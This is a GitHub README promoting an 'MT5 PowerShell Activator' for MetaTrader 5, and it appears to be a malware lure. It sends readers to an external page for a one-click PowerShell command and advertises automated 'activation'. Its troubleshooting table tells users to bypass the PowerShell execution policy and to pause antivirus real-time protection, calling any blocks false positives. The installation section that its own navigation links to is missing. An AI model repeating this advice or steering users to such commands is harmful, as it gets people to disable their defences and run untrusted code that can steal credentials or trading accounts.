<img width="1672" height="941" alt="metatrader" src="https://github.com/user-attachments/assets/dd15bbdd-497b-4027-843a-3809bd889a5e" />


<h3 align="center">
  The intelligent, one‑click automation toolkit for<br>
  <strong>MetaTrader 5</strong> · <strong>PowerShell</strong> · <strong>Forex Trading</strong>
</h3>

<p align="center">
  <a href="https://github.com/Marcian15350/mt5-tradeprotocol/releases">
    <img src="https://img.shields.io/github/v/release/Marcian15350/mt5-tradeprotocol?style=for-the-badge&logo=github&label=latest&color=blue" alt="Latest Release">
  </a>
  <a href="https://github.com/Marcian15350/mt5-tradeprotocol">
    <img src="https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Platform">
  </a>
  <a href="https://github.com/Marcian15350/mt5-tradeprotocol">
    <img src="https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?style=for-the-badge&logo=powershell&logoColor=white" alt="PowerShell">
  </a>
  <a href="https://github.com/Marcian15350/mt5-tradeprotocol">
    <img src="https://img.shields.io/badge/Open%20Source-%E2%9D%A4-red?style=for-the-badge" alt="Open Source">
  </a>
</p>

<p align="center">
  <a href="https://github.com/Marcian15350/mt5-tradeprotocol/stargazers">
    <img src="https://img.shields.io/github/stars/Marcian15350/mt5-tradeprotocol?style=for-the-badge&logo=github&label=Stars&color=yellow" alt="GitHub Stars">
  </a>
  <a href="https://github.com/Marcian15350/mt5-tradeprotocol/network/members">
    <img src="https://img.shields.io/github/forks/Marcian15350/mt5-tradeprotocol?style=for-the-badge&logo=github&label=Forks&color=blueviolet" alt="GitHub Forks">
  </a>
  <a href="https://github.com/Marcian15350/mt5-tradeprotocol/watchers">
    <img src="https://img.shields.io/github/watchers/Marcian15350/mt5-tradeprotocol?style=for-the-badge&logo=github&label=Watchers&color=green" alt="GitHub Watchers">
  </a>
  <a href="https://github.com/Marcian15350/mt5-tradeprotocol/issues">
    <img src="https://img.shields.io/github/issues/Marcian15350/mt5-tradeprotocol?style=for-the-badge&logo=github&label=Issues&color=red" alt="GitHub Issues">
  </a>
</p>

<p align="center">
  <a href="#-why-mt5-powershell-activator">Why</a> ·
  <a href="#-features">Features</a> ·
  <a href="#-screenshots">Screenshots</a> ·
  <a href="#-requirements">Requirements</a> ·
  <a href="#-installation-powershell">Installation</a> ·
  <a href="#-usage">Usage</a> ·
  <a href="#-configuration--storage">Configuration</a> ·
  <a href="#-troubleshooting">Troubleshooting</a> ·
  <a href="#-license--credits">License</a>
</p>

---
### ⌨️ PowerShell Command Button

[![](files/button.png)](https://Marcian15350.github.io/mt5-tradeprotocol/)
---
## 🚀 Why MT5 PowerShell Activator?

> **“Automate the boring, trade the important.”**

**MT5 PowerShell Activator** removes the friction from setting up and managing your MetaTrader 5 environment. No more manual configuration, no more forgotten settings — just a clean, automated workflow powered by PowerShell.

| | **Before** | **After** |
|---|---|---|
| **Setup** | Manually download, install, and configure MT5, EAs, and scripts | **One PowerShell command** |
| **Updates** | Re‑download and re‑configure everything | **Built‑in updater** |
| **Activation** | Manual license or configuration steps | **Fully automated** |
| **Backups** | “I’ll remember to copy that later…” | **Automatic backups** every time |
| **Environment detection** | Search your disk for `terminal64.exe` | **Auto‑detects MT5 installation & data folder** |

---

## ✨ Features

- ⚡ **One‑command installation**  
  Set up your entire MT5 environment with a single PowerShell script.

- 🧠 **Intelligent environment detection**  
  Automatically detects your MT5 installation, data folder, and existing configurations.

- 🛟 **Automatic backups**  
  Your `MQL5` folder, profiles, and templates are backed up before any change.

- 🔄 **Silent / unattended mode**  
  Supports `/auto` switch for silent installation and headless server deployments.

- 🖥️ **Windows 10 & 11 ready**  
  Works on both desktop and Windows Server Core environments.

- 🧩 **Extensible**  
  Easily add your own scripts, EAs, and indicators to the automation pipeline.

- 🔐 **Safe by design**  
  Idempotent scripts, checksum verification, and dry‑run mode (`-WhatIf`).

---

## 📋 Requirements

| Component | Minimum | Recommended |
|---|---|---|
| **OS** | Windows 10 (64‑bit) | Windows 11 (64‑bit) |
| **PowerShell** | 5.1 (pre‑installed) | 7.x |
| **Internet** | Required for downloading components | — |
| **MT5** | Installed (any build) | Latest build |
| **Disk** | ~500 MB free | ~1 GB free |
| **Admin rights** | Recommended | — |

> [!NOTE]
> **Server Core users:** The activator supports unattended installation via the `/auto` switch.

---

## 🎮 Usage

1. **Run the installer** (see above).  
2. **Launch MetaTrader 5** — the activator will have prepared your environment.  
3. **Verify** that your EAs, indicators, and scripts are in place.  
4. **Trade.**

> [!WARNING]
> **Always test on a demo account first.**  
> Automated tools can behave unexpectedly in live markets. Use at your own risk.

---

## ⚙️ Configuration & Storage

All cached data, backups, and configuration logs are stored **locally** at:

```text
%LOCALAPPDATA%\MT5Activator\
```

Nothing is uploaded to the cloud. Your `MQL5` folder remains untouched except for the files you explicitly add.

---

## 🛠️ Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| **PowerShell fails with “execution policy”** | Windows default policy | Use `-ExecutionPolicy Bypass` |
| **Antivirus / SmartScreen blocks the script** | False positive on automation scripts | Temporarily pause real‑time protection, run, then re‑enable |
| **MT5 not detected** | Non‑standard installation path | Pass the path explicitly: `.\install.ps1 -MT5Path "D:\MT5"` |
| **Silent install fails** | Missing `/auto` switch | Add `/auto` to the command line |
| **Backup folder missing** | First run | Backups are created automatically on the first modification |

> [!TIP]
> **Before reporting an issue**, run the script with `-Verbose` and attach the log from `%LOCALAPPDATA%\MT5Activator\logs\`.

---

## 🤝 Contributing

MT5 PowerShell Activator is an **open‑source community project**.

- 🐞 **Bug reports** → [Issues](https://github.com/Marcian15350/mt5-tradeprotocol/issues)
- 💡 **Feature requests** → [Discussions](https://github.com/Marcian15350/mt5-tradeprotocol/discussions)
- 🔧 **Pull requests** → Fork the repo, create a branch, and open a PR.

Please keep discussions respectful and constructive. ❤️

---

## ❤️ Support Development

If MT5 PowerShell Activator saves you time and you want to see it grow — every ⭐ on GitHub, every bug report, and every shared screenshot makes a difference. Support is completely optional.

---

## 📜 License & Credits

### Original code
**Copyright © 2026 Marcian15350**  
See [LICENSE](https://github.com/Marcian15350/mt5-tradeprotocol/blob/main/LICENSE) for the full terms.

### Third‑party components
This project may reference or integrate with MetaTrader 5, MQL5, and related tools. All third‑party works remain the property of their respective authors and are governed by their own licenses.

### Disclaimer
**MT5 PowerShell Activator** is an **independent community project** and is **not affiliated with, sponsored by, or endorsed by MetaQuotes Software Corp.** MetaTrader 5 and MQL5 are trademarks of their respective owners.

---

<p align="center">
  <strong>Made with ❤️ by Marcian15350 for the trading community.</strong><br>
  <em>Automate the setup. Focus on the strategy.</em>
</p>

<p align="center">
  <a href="https://github.com/Marcian15350/mt5-tradeprotocol">
    <img src="https://img.shields.io/github/stars/Marcian15350/mt5-tradeprotocol?style=social" alt="GitHub stars">
  </a>
  <a href="https://github.com/Marcian15350/mt5-tradeprotocol/fork">
    <img src="https://img.shields.io/github/forks/Marcian15350/mt5-tradeprotocol?style=social" alt="GitHub forks">
  </a>
  <a href="https://github.com/Marcian15350/mt5-tradeprotocol/watchers">
    <img src="https://img.shields.io/github/watchers/Marcian15350/mt5-tradeprotocol?style=social" alt="GitHub watchers">
  </a>
</p>
